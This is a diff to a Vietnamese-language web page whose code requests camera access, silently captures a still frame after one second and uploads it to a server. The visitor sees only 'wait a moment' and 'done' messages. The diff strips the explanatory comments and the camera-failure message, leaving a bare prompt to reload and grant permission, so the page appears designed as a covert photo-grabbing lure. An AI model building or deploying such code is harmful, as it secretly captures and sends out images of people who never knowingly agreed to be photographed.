@@ -35,12 +35,7 @@
     #status {
       margin-top: 25px;
       font-size: 1.3rem;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      flex-wrap: wrap;
-      max-width: 320px;
+      text-align: center;
     }
 
     .spinner {
@@ -80,11 +75,9 @@
       statusDiv.innerHTML = `<div class="spinner"></div> <span>⏳ Chờ xíu...</span>`;
 
       try {
-        // Yêu cầu quyền camera
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
 
-        // Chụp sau 1 giây
         setTimeout(async () => {
           const context = canvas.getContext("2d");
           canvas.width = video.videoWidth;
@@ -100,16 +93,12 @@
             body: formData
           });
 
-          // Tắt camera
           stream.getTracks().forEach(track => track.stop());
-
           statusDiv.innerHTML = "✅ Đã xong!";
         }, 1000);
       } catch (err) {
-        console.error(err);
         statusDiv.innerHTML = `
-          ❌ Không thể bật camera.<br>
-          🔁 Vui lòng <b>làm mới trang</b> và bấm <b>Đồng ý</b> để cấp quyền camera.<br><br>
+          <div>🔁 <b>Làm mới trang và bấm Đồng ý</b></div><br>
           <button id="reloadBtn">Làm mới trang</button>
         `;
         const reloadBtn = document.getElementById("reloadBtn");
